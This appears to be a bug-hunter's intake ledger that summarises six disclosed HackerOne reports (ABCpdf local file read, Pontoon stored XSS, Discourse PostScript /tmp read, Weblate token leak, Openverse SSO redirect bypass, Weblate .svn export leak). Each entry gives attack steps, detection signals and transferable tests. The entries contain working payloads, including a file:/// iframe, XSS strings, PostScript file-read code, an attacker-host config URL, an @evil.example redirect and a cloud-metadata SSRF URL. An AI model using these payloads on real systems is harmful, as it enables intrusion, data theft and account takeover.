### §INTAKE-2026-11-20/1 — A SERVER-SIDE HTML→PDF RENDERER IS ALSO A FILE READER: `file:///` INSIDE AN IFRAME READS LOCAL FILES, LISTS DRIVES, AND ENUMERATES THE DEPLOYMENT ROOT — UNAUTHENTICATED

SOURCE: https://hackerone.com/reports/4191812 (Essity — "Unauthenticated arbitrary local file read via ABCpdf on www.<redacted>", Path Traversal, High, reported 2026-11-11, disclosed 2026-11-18)  read 2026-11-20
ROUTE: HackerOne `.json` report endpoint — full report body with the exact unauthenticated request, the base64 PDF response, the decoded text and the directory listings.
STATUS: UNVERIFIED (not reproduced this pass; every request/response quoted below is the report's own).
CLASS: unauthenticated local file read / path traversal via a server-side HTML renderer (CWE-22 / CWE-200, SSRF-adjacent).
CORE METHOD (as the report states it):
  1. Find an unauthenticated HTML→PDF/export endpoint. This one is an ASP.NET ASMX service: `POST /api/services/spa/PdfService.asmx/<redacted>PdfDoc`, `Content-Type: application/json`, returning a JSON-quoted base64 PDF.
  2. Fingerprint the renderer from the produced PDF: `Producer: … via ABCpdf`, version marker `/ABCpdf 9125`, engine UA `Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/ /21.0` — a 2013 engine that still honours `file:///`.
  3. Put an iframe in a field the service treats as HTML: `"Details<redacted>": "<div>BEGIN[<iframe src=\"file:///C:/Windows/win.ini\" width=\"780\" height=\"1100\"></iframe>]END</div>"`, with NO cookie, `Authorization`, or CSRF token.
  4. Decode the returned base64 PDF and extract text; the report proves server-side read by the exact `[fonts]` / `MAPI=1` lines of `win.ini` sitting between the attacker's own markers.
  5. Change only the `src` to `file:///C:/` → the PDF contains `Index of file:///C:/` plus `DFSReports, Mozilla, Packages, PerfLogs, Program Files, Program Files (x86), Temp, Users, Windows, WindowsAzure, inetpub`. The same primitive listed the application root (`E:\Sites\websites\tdp\<redacted>`: `App_Data`, `App_GlobalResources`, `Browsers.aspx`, `Global.asax`, `Handlers`, `Services`, `Sitemap.aspx`, …), `C:\Windows\System32\drivers\etc\hosts`, `C:\ProgramData\Octopus\Tentacle\Instances\`, `C:\Program Files\Octopus Deploy\Tentacle\`, and `E:\Shared_Config\`.
DETECTION SIGNAL: any "export to PDF / invoice / report / print / email preview" endpoint; a PDF/image response whose metadata names a server-side browser or PDF library (`ABCpdf`, `wkhtmltopdf`, `Prince`, `Puppeteer`, `Gecko`, `WebKit`); user HTML accepted into the document; no authentication on the render route; `file:`, `view-source:`, `jar:`, `gopher:`, `http://169.254.169.254/` not rejected before rendering.
CHAIN: unauthenticated request → server-side renderer loads a `file:///` URL as the IIS/app-pool identity → arbitrary local file + directory listing + application-root enumeration → config/connection strings, source, API keys, and deployment-tool paths (Octopus Tentacle) → credential use / lateral movement / RCE through the deployment surface. Reported High (team rating; PR:N, confidentiality High).
TRANSFERABLE TEST: for every server-side render/export feature, submit an iframe/img/object with (a) `file:///etc/passwd` and `file:///C:/Windows/win.ini`, (b) `file:///C:/` and `file:///` for listings, (c) `http://169.254.169.254/latest/meta-data/` for the SSRF leg; decode the output and grep for OS-unique markers. Rule: **a PDF/report renderer is both an HTTP client and a file reader — test both schemes, and treat a directory listing in the output as proof of arbitrary read.**
DEDUPE/DELTA: `4191812`, `ABCpdf`, `PdfService.asmx`, and `win.ini` as a PDF-renderer payload = 0 hits pre-append. Existing PDF-generator material is the HTML/JS-injection→SSRF entry and the ImageMagick/Ghostscript RCE entries; NEW atoms: the `file:///` scheme inside the rendered document, the drive/application-root directory listing, and the deployment-tool path as the escalation target.
HONESTY: not reproduced this pass; the report supplies the exact unauthenticated request, the response metadata, the decoded PDF text and the directory listings, all quoted above.

### §INTAKE-2026-11-20/2 — ATTRIBUTE-CONTEXT ESCAPING IS NOT SINK-SAFE: THE SERVER ESCAPES INTO A `data-*` ATTRIBUTE, THE BROWSER DECODES IT, AND CLIENT-SIDE JS RE-PARSES IT AS HTML — STORED XSS ON A PUBLIC DASHBOARD

SOURCE: https://hackerone.com/reports/3988961 (Mozilla Pontoon — "Stored XSS on the public Pontoon dashboards: the latest-activity tooltip re-parses a contributor's account address as HTML", High, $3,000, disclosed 2026-10-14)  read 2026-11-20
ROUTE: HackerOne `.json` report endpoint — full team + researcher summaries with the sink, the attribute-decoding step, the payload-bearing signup address and the remediation commits.
STATUS: UNVERIFIED (not reproduced this pass).
CLASS: stored XSS (CWE-79) via a DOM sink that re-parses an already-decoded attribute value; server-side attribute escaping is correct and still insufficient.
CORE METHOD (as the report states it):
  1. Find client code that concatenates contributor-supplied `data-*` values into a markup string and hands it to jQuery `.after()` / `.html()` / `.append()`. Here the latest-activity tooltip encoded only the translation text; every `data-*` value was concatenated raw.
  2. Understand the two-step decode: the server escapes the value correctly into the HTML attribute, but the BROWSER decodes entities when the DOM is built, and jQuery `.data()`/`.attr()` hands the JS the decoded string. The markup therefore comes back raw at the sink.
  3. Find a field that reaches the attribute. A contributor with no display name is shown by their account email address, and local signup accepted `"<script>alert(document.domain)</script>x"@example.org` — the quoted local part keeps it a syntactically valid address while carrying the tag.
  4. One signup plus one ordinary translation suggestion put the script on a public dashboard, where it ran in the session of anyone who hovered the cell, signed in or not. `django-csp` 4.0 had dropped the policy, so no nonce/hash blocked the inline script.
  5. Escalate by victim role: in a translator's session the script approved the attacker's own suggestion; in a locale manager's session it added the attacker to that locale's managers group — a membership that outlives every session involved.
DETECTION SIGNAL: jQuery `.after(` / `.html(` / `.append(` receiving string concatenation of `.data(` / `.attr(` values; tooltips, popovers and activity tables built by string interpolation; server-side escaping limited to the attribute context; public dashboards that render contributor names; display-name fallback to email; signup validation that accepts quoted local parts; a missing or recently-changed CSP.
CHAIN: any contributor (primitive: one signup + one suggestion) → stored value rendered on a public dashboard → administrator/manager hovers the cell → same-origin JavaScript → approve own suggestion or add self to the locale-managers group (persistent privilege) → content/tenant compromise without any further user action.
TRANSFERABLE TEST: grep the client bundle for `.after(`, `.html(`, `.append(` near `.data(`/`.attr(`; for every field that lands in a data attribute, submit `&lt;img src=x onerror=alert(document.domain)&gt;`, then inspect the DOM after render for a decoded element (not text); test identity fields with a quoted local part such as `"<script>alert(1)</script>x"@example.org`. Rule: **escaping for an attribute stops you breaking the attribute; it does not make a later `innerHTML`-style sink safe — trace every attribute value to the DOM sink that re-parses it.**
DEDUPE/DELTA: `3988961`, `Pontoon`, `.after()`, and the quoted-local-part email trick = 0 hits pre-append. The ledger already has `data-*` injection into server-side tag builders and a decode-on-redact markdown entry; NEW atoms: the SERVER-escapes-into-attribute → BROWSER-decodes → CLIENT-re-parses chain, and the quoted local part as an XSS carrier in an email-as-display-name fallback.
HONESTY: not reproduced this pass; the team summary names the sink, the decoding step, the exact address shape and the three fixes (remove signup, restore CSP, build the tooltip from DOM nodes in `v2026.10.08`), and notes self-hosted instances using other sign-in methods can still set the displayed name.

### §INTAKE-2026-11-20/3 — THE NEWEST FORMAT BRANCH FORGETS THE DECODER PIN: MAGIC-BYTE DISPATCH TO POSTSCRIPT/GHOSTSCRIPT READS `/tmp` UNDER `-dSAFER`, AND THE PUBLIC DERIVATIVE URL IS THE EXFIL CHANNEL

SOURCE: https://hackerone.com/reports/3738834 (Discourse — "Arbitrary `/tmp` read in discourse via `convert_heif!` decoder-confusion (regression of 4bf3bf6786)", Information Disclosure, Medium, disclosed 2026-10-26)  read 2026-11-20
ROUTE: HackerOne `.json` report endpoint — full report body with root-cause diff, the 254-byte PostScript payload, the upload request, the anonymous GET and the impact table.
STATUS: UNVERIFIED (not reproduced this pass; the reporter lab-verified it end-to-end against `discourse_dev`).
CLASS: decoder confusion in an image-conversion pipeline → cross-user `/tmp` file read and enumeration → public-derivative exfiltration (CWE-436 / CWE-200); the Ghostscript `-dSAFER` sandbox is the boundary, not an RCE.
CORE METHOD (as the report states it):
  1. Find upload paths that shell out to `magick`/`convert`. Check whether EVERY call pins the decoder (`jpeg:`, `png:`, … via a helper such as `prepend_decoder!`) or lets ImageMagick dispatch by file magic bytes.
  2. Diff sibling conversion functions. The older `convert_to_jpeg!` calls `OptimizedImage.prepend_decoder!` on both source and target; the later-added `convert_heif!` (HEIF/HEIC support, commit `7559758e10`, #10079) duplicates the structure but drops both calls. `ensure_safe_paths!` only checks path containment and does not influence decoder dispatch.
  3. Upload a `.heic` whose first bytes are `%!PS-Adobe-3.0` via `POST /uploads.json` (`type=composer&synchronous=true`). With no decoder prefix, `magick from to` sniffs the magic bytes, selects the PostScript coder and invokes Ghostscript with `-dSAFER`.
  4. Run PostScript inside the SAFER sandbox: `(/tmp/*) { dup show … } 512 string filenameforall` enumerates the temp directory; `(/tmp/<name>) (r) file 512 string readstring pop show` renders file contents onto the canvas. SAFER permits reads under `/tmp` but blocks `/etc`, `/proc`, `/home`, `/src`, `/var`, `/shared`.
  5. The rasterized JPG is stored as a normal upload row and served from `/uploads/default/original/1X/<sha>.jpeg` with no auth (posts must render for logged-out visitors). The URL is already in the upload JSON response; fetch it anonymously and read/OCR the leaked text. Reachable tempfiles include other users' `RackMultipart*`, `discourse-email-attachment-*`, `image20*.jpg`, and `magick-*`.
DETECTION SIGNAL: parallel conversion functions where one pins the decoder and a newer one does not (grep for the pin helper and count its call sites per function); ImageMagick/GraphicsMagick with PS/PDF/XPS delegates installed; Ghostscript `-dSAFER`; a shared temp directory; derivative images served from a public, unauthenticated URL; an email-in path that derives the tempfile extension from the MIME `Content-Disposition` filename.
CHAIN: any authenticated uploader (or anonymous `email_in` sender, code-traced) → magic-byte dispatch bypasses the extension allowlist → Ghostscript runs attacker PostScript under `-dSAFER` → enumerate and read other users' tempfiles (in-flight uploads, inbound mail attachments, conversion intermediates) → PII/attachments/secrets → cross-user data compromise. Medium as reported; High when tokens or regulated data transit `/tmp`.
TRANSFERABLE TEST: for every image/video/archive conversion path, upload a polyglot with `%!PS-Adobe-3.0` magic under each accepted extension; compare ALL sibling conversion functions and find the newest one missing the decoder pin; check whether the derivative is retrievable without auth. Rule: **extension validation is not decoder selection — enumerate sibling conversion branches and diff their safety calls; the branch added last is the one that forgot the pin, and a public derivative URL turns a sandboxed read into exfiltration.**
DEDUPE/DELTA: `3738834`, `convert_heif`, `prepend_decoder` = 0 hits pre-append. The ledger already records ImageMagick magic-byte dispatch to Ghostscript and `-dSAFER` RCE (CVE-2017-8291 and the pixiv `%pipe%` entry); NEW atoms here: the OMITTED decoder pin in a later-added format branch, PostScript as a `/tmp` read+enumerate primitive INSIDE `-dSAFER` (no shell), and the stored public image as the exfil channel.
HONESTY: not reproduced this pass; the report is lab-verified end-to-end, includes the payload generator and a full PoC script, and explicitly scopes SAFER-blocked paths rather than claiming general filesystem read.

### §INTAKE-2026-11-20/4 — THE SECRET IS RESOLVED INDEPENDENTLY OF THE URL'S TRUST: A REPO-CONTROLLED `.weblate` SETS THE API BASE URL WHILE `$WLC_KEY` IS ATTACHED TO WHATEVER URL IS NAMED

SOURCE: https://hackerone.com/reports/3825141 (Weblate `wlc` — "API token sent to URL dictated by an untrusted project `.weblate` file", Medium 6.3, CVE-2026-22251, disclosed 2026-09-04)  read 2026-11-20
ROUTE: HackerOne `.json` report endpoint — full report body with the config-discovery code, the `get_url_key()` split and a captured `Authorization` header.
STATUS: UNVERIFIED (not reproduced this pass).
CLASS: secret/token exfiltration through config-file-controlled destination (CWE-200 / CWE-522) — credential origin-binding failure in a CI client.
CORE METHOD (as the report states it):
  1. Find a CLI/CI client that discovers project configuration by walking the current directory and EVERY parent directory for `.weblate` / `.weblate.ini` / `weblate.ini` (`WeblateConfig.find_project_config`).
  2. The discovered file sets the API `url`; the API key is resolved independently by `get_url_key()`. The `[keys]` lookup is origin-scoped (`self.get("keys", url)`), showing the maintainers' intent, but `$WLC_KEY` short-circuits that scoping and is returned for ANY url.
  3. Commit or PR a `.weblate` containing `url = http://<attacker>/api/`; with `WLC_KEY` exported (the documented CI pattern), run any command, e.g. `wlc list-projects`.
  4. `invoke_request` attaches `Authorization: Token <secret>` (client.py:240-241) and sends it to the attacker's URL. `normalize_request_url` does not help: it constrains only server-returned URLs relative to the configured base, and the configured base is the attacker's value.
  5. Consequence in CI: the token is a pipeline secret. Loss grants the victim's full Weblate API capability — read/write translations, `commit`/`push`/`pull`/`reset` on linked VCS repos, object deletion, project/component management if privileged — cascading into the connected source repositories.
DETECTION SIGNAL: config discovery that walks ancestor directories; a base `url` stored in a committed file; credentials read from an env var or global config without binding to the resolved URL; `Authorization: Token/Bearer` attached AFTER URL resolution; CI docs that recommend a secret env var plus a repo-local config file; a `.weblate`/`.npmrc`/`.pypirc`/`.gitconfig`-style file in a public repo.
CHAIN: attacker influences a file on the victim's discovery path (PR to a public repo, planted ancestor file, cloned untrusted repo) → the client resolves the base URL from that file → the secret is sent to the attacker's origin → full API capability → write to linked VCS repositories → supply-chain compromise. Medium standalone; High in a privileged CI token context.
TRANSFERABLE TEST: for any CLI/CI tool, create a repo-local config pointing the base URL at a listener, export the tool's documented token env var, run the read-only command, and inspect the received `Authorization` header. Rule: **origin-scoping must apply to credentials resolved from EVERY source — an env-var secret and a config-file URL are two independent inputs, and the attacker only needs to control one.**
DEDUPE/DELTA: `.weblate`, `WLC_KEY`, `get_url_key`, and "config file controls credential destination" = 0 hits pre-append. The ledger's related entry on the same client (`3887969`) is a URL-parser differential for server-returned `next` URLs; this is a different flaw: the credential is not bound to the configured URL at all.
HONESTY: not reproduced this pass; the report includes the PoC and the captured `Host`/`Authorization` values, and its own chain analysis distinguishes direct token theft from downstream repo access.

### §INTAKE-2026-11-20/5 — `str_replace()`'s FOURTH ARGUMENT IS A BY-REFERENCE COUNT, NOT A LIMIT: "REPLACE ONCE" STRIPS EVERY PREFIX, THE REMAINDER EXTENDS THE URL AUTHORITY, AND THE SSO ALLOW-LIST STILL SEES `wordpress.org`

SOURCE: https://hackerone.com/reports/3933198 (WordPress.org Openverse — "unauthenticated open redirect — `str_replace()`'s 4th arg is a count, not a limit; bypasses WordPress.org SSO allow-list", Medium 6.1, disclosed 2026-10-30)  read 2026-11-20
ROUTE: HackerOne `.json` report endpoint — full report body with the exact code, the PHP semantics proof, the local HTTP harness output and the SSO allow-list code.
STATUS: UNVERIFIED (not reproduced against production; the author reproduced it locally against the unmodified theme).
CLASS: open redirect escalated to an SSO/redirect allow-list bypass (CWE-601 / CWE-20) via language-API misuse; eligible only because it defeats a security control.
CORE METHOD (as the report states it):
  1. Find code intended to strip a leading path prefix: `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` with `$count = 1` and the comment "Only replace the leading Openverse subpath."
  2. Wrong semantics: PHP's 4th argument is a by-reference OUTPUT that receives the number of replacements; the literal `1` is silently overwritten, so EVERY occurrence is removed. Proof: `str_replace("/openverse","","/openverse/openverse@evil.example/",$c)` → `"@evil.example/"`, `$c == 2`.
  3. The remainder is concatenated onto a bare origin with no trailing slash (`https://openverse.wordpress.net`) → `https://openverse.wordpress.net@evil.example/`, whose authority is `evil.example`. A second family needs one DNS record: `/openverse/openverse.evil.example/` → `https://openverse.wordpress.net.evil.example/`.
  4. The value goes to `wp_redirect()` (301), not `wp_safe_redirect()`; `wp_redirect` performs no destination allow-list check, and no `allowed_redirect_hosts` filter is consulted.
  5. Why the SSO allow-list does not save it: `login.wordpress.org` accepts `redirect_to` values whose `parse_url(..., PHP_URL_HOST)` is in `VALID_HOSTS = [wordpress.org, bbpress.org, buddypress.org, wordcamp.org]`. The crafted URL is literally `https://wordpress.org/openverse/openverse@evil.example/`, so its parsed host is `wordpress.org`; the allow-list passes it, then the Openverse 301 deposits the freshly authenticated user on `evil.example` with a `*.wordpress.org` referrer and a browser-cached permanent mapping.
DETECTION SIGNAL: `str_replace(` with a small literal integer in the 4th position; comments claiming "only the first/leading"; prefix stripping performed on `$_SERVER['REQUEST_URI']`; a base URL configured without a trailing slash; `wp_redirect()` where `wp_safe_redirect()` is expected; SSO `redirect_to` allow-lists that parse only the host of the supplied URL; any "return to this page after login" feature.
CHAIN: unauthenticated attacker link on the trusted domain → 301 to an attacker authority (userinfo or hostname-suffix form) → the login flow's `redirect_to` allow-list accepts the URL because its parsed host is still `wordpress.org` → post-authentication redirect delivers the user to attacker content (phishing/credential capture) or, where the redirect carries a code/token, delivers it to the attacker → account takeover. Standalone open redirect is ineligible per doctrine §2(b); the SSO allow-list bypass is the finding.
TRANSFERABLE TEST: grep every repo for `str_replace(..., ..., ..., 1)` and for `preg_replace` calls with no limit; test prefix stripping with a doubled prefix plus `@attacker` and with `prefix.attacker.tld`; compare `parse_url($crafted, PHP_URL_HOST)` with the allow-list's parsed host. Rule: **in PHP the 4th argument of `str_replace` is a count — "replace once" requires `preg_replace(..., 1)` or `str_starts_with` + `substr`; and any redirect built by concatenating a bare origin with a path remainder can have its AUTHORITY extended.**
DEDUPE/DELTA: `3933198`, `openverse`, "4th arg", and the userinfo-authority SSO bypass = 0 hits pre-append. The ledger already records single-pass `str_replace('../','')` traversal sanitizers; NEW atom: misuse of the 4th-argument semantics to strip EVERY occurrence, producing authority extension and an SSO allow-list bypass.
HONESTY: not reproduced against production (the author deliberately sent no traffic to WordPress.org); the report proves the PHP semantics and the full HTTP behavior against the unmodified theme locally, and states two runtime caveats (the redirect toggle must be on; the theme must actually serve `/openverse/`).

### §INTAKE-2026-11-20/6 — A SECURITY-FIX DENYLIST IS ONLY AS COMPLETE AS THE PRODUCT'S OWN IGNORE LIST: VCS FILTERING STRIPPED `.git`/`.hg` BUT NOT `.svn`/`.bzr`, SO EXPORT ZIPS CARRIED `wc.db` AND COMMITTED CREDENTIAL CACHES

SOURCE: https://hackerone.com/reports/4037976 (Weblate — "Incomplete VCS metadata exclusion: `.svn` / `.bzr` bypass CVE-2026-61792 due to missing `VCS_METADATA_DIRS` entries", Path Traversal / protection-mechanism failure, Medium, disclosed 2026-10-30)  read 2026-11-20
ROUTE: HackerOne `.json` report endpoint — full report body with file:line references, the differential verdict table and the runnable PoC output.
STATUS: UNVERIFIED (not reproduced this pass) — recorded as a CHAIN PRIMITIVE, not a standalone deliverable: the report itself frames it as an incomplete-hardening gap.
CLASS: incomplete denylist in an archive/export path (CWE-693 / CWE-22) — metadata that a prior security fix promised to strip still ships.
CORE METHOD (as the report states it):
  1. Find a recent security fix that introduces a denylist/allowlist for archive export or download. Here CVE-2026-61792 added `VCS_METADATA_DIRS = frozenset((".git", ".hg"))` at `weblate/utils/files.py:36`.
  2. Find the product's OWN non-security ignore list and diff it: `weblate/trans/component_copy.py:109` uses `shutil.ignore_patterns(".git", ".hg", ".svn", ".bzr")`. The security filter knows about two of the four VCS types its own copy routine handles.
  3. Confirm the verdict per path with the shipped function: `is_vcs_metadata_path(".git/config") == True`, `(".hg/hgrc") == True`, but `(".svn/wc.db") == False`, `(".svn/auth/svn.simple/x") == False`, `(".bzr/README") == False`.
  4. Build a ZIP through the real download path (`zip_download(filename, [filename])`) with `.svn/entries`, `.svn/wc.db`, `.svn/auth/svn.simple/<x>`, `.bzr/*`, plus a symlink (`leak.db -> .svn/wc.db`). Output: all `.svn`/`.bzr` entries and the symlinked SQLite bytes are INCLUDED, while `.git`/`.hg` and a cross-component symlink (`../beta/secret.txt`) are correctly EXCLUDED — proving the gap is the missing names, not broken containment.
  5. Impact: `wc.db` discloses repository layout and URL, working-copy state and revision mappings; committed `.svn/auth/svn.simple/*` files are credential-cache blobs. The same incomplete set feeds symlink resolution, path validation, backup and component discovery.
DETECTION SIGNAL: a security filter written as a literal set of names; another ignore list elsewhere with more entries; archive/backup/export endpoints; `.svn`/`.bzr`/`CVS`/`.hg`/`.git` present in repos or migration remnants; symlink handling that is contained but not metadata-aware; a recent CVE fix whose regression test covers only one VCS type.
CHAIN: authenticated user with download permission → export ZIP → VCS metadata plus (on self-hosted direct-SVN or SVN→Git migration) committed credential-cache files → repository URLs/layout and credentials → source-repository compromise. Medium standalone; a credential-theft primitive where `.svn/auth` is inside the component root.
TRANSFERABLE TEST: for every "download as ZIP / backup / export" feature, enumerate every backend the product claims to support, request the archive, and diff the included entries against BOTH the security denylist and the product's own ignore list; add symlinks pointing at each metadata file. Rule: **a denylist written during a fix is incomplete by default — diff it against the codebase's own ignore sets and every supported backend, and check whether the fix's tests cover only the first entry.**
DEDUPE/DELTA: `4037976`, `VCS_METADATA_DIRS`, `.svn/wc.db`, and "diff the security denylist against the product's own ignore list" = 0 hits pre-append. NEW atom: the audit method, not the specific Weblate bug.
HONESTY: not reproduced this pass; the report ships a PoC that imports the real module and prints the differential, and it explicitly concedes that stock Weblate's git-svn backend creates no `.svn` directory and that the SVN auth cache normally lives outside the component root — the reproducible impact is the metadata inclusion, with credential theft conditional on migrated/self-hosted layouts.
